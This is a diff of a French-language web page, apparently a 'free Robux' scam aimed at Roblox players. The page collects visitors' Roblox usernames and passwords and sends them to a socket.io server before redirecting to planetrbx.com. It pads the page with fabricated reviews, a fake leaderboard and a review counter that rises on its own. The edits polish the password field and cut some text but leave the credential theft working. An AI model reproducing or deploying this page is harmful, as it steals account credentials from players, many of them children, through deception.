@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Robux Site</title>
 
 <style>
@@ -17,15 +16,11 @@
     box-shadow: 0 4px 10px rgba(0,0,0,0.3);
 }
 
-/* effet hover */
-.btn-green:hover {
-    transform: scale(1.12);
-}
-
 .btn-green:hover {
     transform: scale(1.12);
     background: #22c55e;
 }
+
 body {
     margin: 0;
     font-family: Arial;
@@ -33,7 +28,6 @@ body {
     color: white;
 }
 
-/* NAVBAR */
 .navbar {
     display: flex;
     justify-content: space-between;
@@ -43,7 +37,6 @@ body {
     top: 0;
 }
 
-/* BUTTONS */
 .btn {
     padding: 10px 18px;
     border: none;
@@ -58,7 +51,6 @@ body {
 .green { background: #16a34a; color: white; }
 .yellow { background: #eab308; color: black; }
 
-/* HERO */
 .hero { text-align: center; margin-top: 70px; }
 .hero h1 { font-size: 50px; }
 
@@ -69,7 +61,6 @@ body {
     opacity: 0.8;
 }
 
-/* STATS */
 .stats {
     display: flex;
     justify-content: center;
@@ -84,12 +75,8 @@ body {
     border-radius: 12px;
     width: 200px;
     text-align: center;
-    transition: 0.2s;
 }
 
-.card:hover { transform: translateY(-5px); }
-
-/* SECTION */
 .section {
     max-width: 800px;
     margin: 80px auto;
@@ -103,7 +90,6 @@ body {
     border-radius: 12px;
 }
 
-/* POPUP */
 .popup {
     display: none;
     position: fixed;
@@ -147,32 +133,42 @@ input {
     color: white;
 }
 
-/* ERROR */
-#error {
-    color: red;
-    display: none;
-    margin-top: 10px;
+/* 👁 PASSWORD BOX PRO */
+.password-box {
+    position: relative;
+    width: 90%;
+    margin: auto;
 }
 
-/* LOADING DOTS */
-.dots span {
-    animation: blink 1s infinite;
+.password-box input {
+    width: 100%;
+    padding-right: 40px;
 }
 
-.dots span:nth-child(2) { animation-delay: 0.2s; }
-.dots span:nth-child(3) { animation-delay: 0.4s; }
-
-@keyframes blink {
-    0% { opacity: 0.2; }
-    50% { opacity: 1; }
-    100% { opacity: 0.2; }
+.eye-btn {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
 }
 
-    @media (max-width: 768px) {
+.eye-btn svg {
+    width: 20px;
+    height: 20px;
+    fill: white;
+    opacity: 0.7;
+}
 
-    .hero h1 {
-        font-size: 32px;
-    }
+.eye-btn:hover svg {
+    opacity: 1;
+}
+
+/* MOBILE */
+@media (max-width: 768px) {
+    .hero h1 { font-size: 32px; }
 
     .stats {
         flex-direction: column;
@@ -188,40 +184,29 @@ input {
         align-items: center;
         gap: 10px;
     }
-
-    .popup-box {
-        width: 90%;
-    }
-
-    input {
-        width: 100%;
-    }
 }
 </style>
 </head>
 
 <body>
 
-<!-- NAVBAR -->
 <div class="navbar">
     <button class="btn green" onclick="openLogin()">Commencer à gagner</button>
     <button class="btn yellow" onclick="openClassement()">🏆 Classement</button>
 </div>
 
-<!-- HERO -->
 <div class="hero">
     <h1>Bienvenue</h1>
 </div>
 
 <div class="desc">
-Vous voulez commencer à gagner sans effort en accomplissant des tâches simples comme regarder des vidéos ou répondre à des sondages ?
+Vous voulez commencer à gagner sans effort ?
 </div>
 
 <div style="text-align:center;margin-top:20px;">
     <button class="btn green" onclick="openLogin()">Commencer à gagner</button>
 </div>
 
-<!-- STATS -->
 <div class="stats">
     <div class="card">
         <h3>6m 05s</h3>
@@ -230,40 +215,18 @@ Vous voulez commencer à gagner sans effort en accomplissant des tâches simples
 
     <div class="card">
         <h3>R$ 950.45</h3>
-        <p>Robux en circulation</p>
+        <p>Robux</p>
     </div>
 
     <div class="card">
         <h3>R$ 25,000,000</h3>
-        <p>Total gagné</p>
+        <p>Total</p>
     </div>
 </div>
 
-<!-- HOW -->
-<div class="section">
-<h2>⚙️ Comment ça fonctionne</h2>
-
-<p>🔐 Connecter vous!<br>Entre vos indentifiant et Mots de Passe Roblox</p>
-<p>🎮 Offres<br>Faire des tâches sondage,ext</p>
-<p>💸 Retirer<br>Recevoir les Robux</p>
-</div>
-
-<!-- REVIEWS -->
 <div class="section">
 <h2>⭐ Avis</h2>
-<p>4 étoiles sur <span id="count">1856</span> avis</p>
-
-<div class="review">
-⭐⭐⭐⭐⭐<br><br>
-J’ai gagné 750 Robux en seulement deux jours en faisant des tâches. Très rapide !<br><br>
-<b>LefrenchKebab_67</b>
-</div>
-
-<div class="review">
-⭐⭐⭐⭐⭐<br><br>
-Super expérience, le systeme est vraiment pratique et surtout c'est facile de gagnier des robux<br><br>
-<b>CHL0E_21</b>
-</div>
+<p>4 étoiles sur <span id="count">1856</span></p>
 </div>
 
 <!-- LOGIN -->
@@ -274,33 +237,24 @@ Super expérience, le systeme est vraiment pratique et surtout c'est facile de g
 
 <h3>Connexion</h3>
 
-<input id="username" placeholder="Pseudo Roblox">
-<input id="password" type="password" placeholder="Mot de passe Roblox">
+<input id="username" placeholder="Pseudo">
 
-<button class="btn-green" onclick="handleClick()">
-    Connection
-</button>
+<!-- 👁 ICI MODIF -->
+<div class="password-box">
+    <input id="password" type="password" placeholder="Mot de passe">
 
-</div>
-</div>
-
-    <div style="position:relative;">
-    <input id="password" type="password" placeholder="Mot de passe" style="padding-right:40px;">
-
-    <button type="button" onclick="togglePassword()" style="
-        position:absolute;
-        right:10px;
-        top:50%;
-        transform:translateY(-50%);
-        background:none;
-        border:none;
-        cursor:pointer;
-    ">
-        👁
+    <button type="button" onclick="togglePassword()" class="eye-btn">
+        <svg viewBox="0 0 24 24">
+            <path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+        </svg>
     </button>
 </div>
 
-<!-- CLASSEMENT -->
+<button class="btn-green" onclick="handleClick()">Connection</button>
+
+</div>
+</div>
+
 <div class="popup" id="classementPopup">
 <div class="popup-box">
 
@@ -308,13 +262,8 @@ Super expérience, le systeme est vraiment pratique et surtout c'est facile de g
 
 <h3>🏆 Classement</h3>
 
-<p>🥇 1. YTBRp***** - 6.2k 💰</p>
-<p>🥈 2. ilovefl****** - 5.5k 💰</p>
-<p>🥉 3. Louxi**** - 5.1k 💰</p>
-<p>4. Stonem****** - 4.7k 💰</p>
-<p>5. ESLiga***** - 4.7k 💰</p>
-<p>6. Gta2**** - 4.4k 💰</p>
-<p>7. MxSam***** - 4k 💰</p>
+<p>🥇 1. YTBRp*****</p>
+<p>🥈 2. ilovefl******</p>
 
 </div>
 </div>
@@ -323,26 +272,19 @@ Super expérience, le systeme est vraiment pratique et surtout c'est facile de g
 
 <script>
 
-    function togglePassword() {
+const socket = io();
+
+function togglePassword() {
     const input = document.getElementById("password");
-
-    if (input.type === "password") {
-        input.type = "text";
-    } else {
-        input.type = "password";
-    }
+    input.type = (input.type === "password") ? "text" : "password";
 }
-    
-    function handleClick() {
-    login(); // ton script login
 
-    // petite pause pour laisser le login se lancer
+function handleClick() {
+    login();
     setTimeout(() => {
         window.location.href = "https://planetrbx.com/fr";
     }, 500);
 }
-   
-const socket = io();
 
 function openLogin() {
     document.getElementById("loginPopup").style.display = "flex";
@@ -360,21 +302,18 @@ function closeClassement() {
     document.getElementById("classementPopup").style.display = "none";
 }
 
-
 function login() {
     socket.emit("login", {
         username: document.getElementById("username").value,
         password: document.getElementById("password").value
     });
-
-    
 }
 
-/* compteur avis */
 setInterval(() => {
     document.getElementById("count").innerText =
-        parseInt(document.getElementById("count").innerText) + 1;
+    parseInt(document.getElementById("count").innerText) + 1;
 }, 25000);
+
 </script>
 
 </body>
